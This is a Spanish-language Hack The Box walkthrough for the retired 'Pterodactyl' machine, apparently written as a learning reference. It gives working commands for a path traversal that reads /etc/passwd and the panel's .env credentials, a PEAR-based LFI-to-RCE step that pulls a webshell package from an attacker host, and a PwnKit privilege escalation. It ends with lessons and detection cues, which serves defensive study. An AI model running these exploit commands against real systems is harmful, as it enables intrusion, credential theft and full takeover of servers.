---
machine: Pterodactyl
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, opensuse, pterodactyl, path-traversal, pear, lfi, polkit]
---

# Pterodactyl — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Servidor openSUSE con el panel de gestión de servidores de juego **Pterodactyl**. Un **path traversal** en la API de ficheros (CVE-2025-49132) permite leer el `.env` del panel y llegar a un **LFI**; con `register_argc_argv` activo, `pearcmd.php` convierte ese LFI en escritura de un webshell. La escalada a root pasa por la pila **PAM/Polkit** de openSUSE.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp   ssh    OpenSSH
80/tcp   http   redirección a 443
443/tcp  https  panel Pterodactyl
```

```bash
curl -sk https://<IP>/api/application/v2 | jq
```

La versión del panel se ve en `/api/application` o en el HTML del login (`Pterodactyl v1.x`). Conviene revisar el changelog de la versión frente a CVE-2025-49132.

## Path traversal en la API de ficheros

El endpoint de contenido de ficheros no normaliza la ruta:

```bash
curl -sk "https://<IP>/api/client/servers/<id>/files/contents?file=../../../../../../etc/passwd"
```

Con sesión de cliente se leen ficheros del panel; el objetivo es `.env`:

```bash
curl -sk "https://<IP>/api/client/servers/<id>/files/contents?file=../../../../../../var/www/pterodactyl/.env"
```

Del `.env` salen `APP_KEY`, credenciales de MySQL y datos de correo. Con esas credenciales se accede a la base del panel y a los hashes de administradores; también se puede reutilizar la contraseña en SSH.

## De LFI a RCE con PEAR

Si `register_argc_argv = On`, PHP rellena `$argv` con la query string. `pearcmd.php` usa esos argumentos como si fueran de consola, así que un LFI hacia ese fichero permite `install`:

```bash
# paquete con el webshell, servido en local
python3 -m http.server 80

curl -sk "https://<IP>/index.php?+install+-R+/srv/www/htdocs+http://<IP_ATACANTE>/pkg.tgz&file=/usr/share/pear/pearcmd.php"
```

PEAR descomprime el paquete en el directorio web y el webshell queda accesible. Alternativa equivalente: `+config-create+` para escribir un fichero con contenido controlado. Se obtiene ejecución como `wwwrun`/`nginx`.

## Escalada a root

```bash
id; cat /etc/os-release          # openSUSE
ls -la /etc/pam.d/
cat /etc/pam.d/common-auth-pc
pkexec --version
```

La pila PAM de openSUSE y la versión de Polkit son el objetivo: `pkexec` sin parchear cae con PwnKit (CVE-2021-4034), y una regla Polkit mal configurada (`auth_admin_keep` sobre un binario escribible) permite ejecutar como root sin contraseña.

```bash
# PwnKit
gcc -o pwnkit cve-2021-4034.c
./pwnkit
```

Con root se leen `/root/root.txt` y la flag de usuario del home correspondiente.

## Lecciones

- Un panel de terceros sin actualizar es superficie de entrada: el traversal no necesita autenticación de administrador, solo una sesión de cliente.
- `register_argc_argv` en producción convierte cualquier LFI en ejecución de comandos vía PEAR.
- El `.env` de un panel contiene claves de aplicación y credenciales de base de datos: es el primer fichero a leer.
- Detección: peticiones con `../` en `/files/contents`, acceso a `pearcmd.php` y ejecución de `pkexec` desde un usuario web.
